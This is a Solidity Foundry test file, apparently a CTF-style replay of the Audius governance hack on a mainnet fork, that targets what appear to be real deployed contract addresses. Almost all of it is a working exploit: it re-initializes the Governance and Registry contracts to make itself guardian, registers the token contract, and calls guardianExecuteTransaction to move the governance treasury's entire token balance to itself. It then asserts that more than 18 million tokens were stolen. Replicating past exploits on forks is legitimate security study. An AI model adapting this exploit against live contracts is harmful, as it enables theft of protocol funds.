// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.5.0;

import "ds-test/test.sol";
import "forge-std/Vm.sol";
import "forge-std/console.sol";

import "../src/Governance.sol";
import "../src/Staking.sol";
import "../src/DelegateManager.sol";
import "../src/Registry.sol";
import "../src/token/AudiusToken.sol";

contract ContractTest is DSTest {
    Governance gov;
    Staking st;
    DelegateManager dm;
    Registry reg;
    AudiusToken token;

    address constant private VM_ADDRESS = address(bytes20(uint160(uint256(keccak256('hevm cheat code')))));
    Vm public constant vm = Vm(VM_ADDRESS);

    function setUp() public {
        gov = Governance(0x4DEcA517D6817B6510798b7328F2314d3003AbAC);
        st = Staking(0xe6D97B2099F142513be7A2a068bE040656Ae4591);
        dm = DelegateManager(0x4d7968ebfD390D5E7926Cb3587C39eFf2F9FB225);
        reg = Registry(0xd976d3b4f4e22a238c1A736b6612D22f17b6f64C);
        token = AudiusToken(0x18aAA7115705e8be94bfFEBDE57Af9BFc265B998);
    }

    function testAudiusHack() public {
        vm.createSelectFork(vm.envString("ETH_RPC_URL"), 15201700);
        console.log("Audius Balance: ", token.balanceOf(address(this)));

        // HACK AWAY! (Don't forget you can use vm.roll(newBlock) to simulate multiple blocks)

        // @ctf: contracts can be initialized again, as `initialized` is set to false at the end of the modifier

        emit log_named_uint("to steal", token.balanceOf(address(gov)));

        uint256 per = gov.getVotingPeriod();
        uint256 exec = gov.getExecutionDelay();
        uint16 max = gov.getMaxInProgressProposals();

        gov.initialize(
            address(reg),
            per,
            exec,
            1,
            max,
            address(this) // set guard to this to exec freely
        );
        reg.initialize();

        bytes32 name = bytes32(uint256(69420));
        reg.addContract(name, address(token));
        // add token contract to "transfer"

        bytes memory data = abi.encode(address(this), token.balanceOf(address(gov)));
        gov.guardianExecuteTransaction(name, 0, "transfer(address,uint256)", data);

        console.log("Audius Balance: ", token.balanceOf(address(this)));
        require(token.balanceOf(address(this)) > 18_000_000 ether, "do better!");
    }
}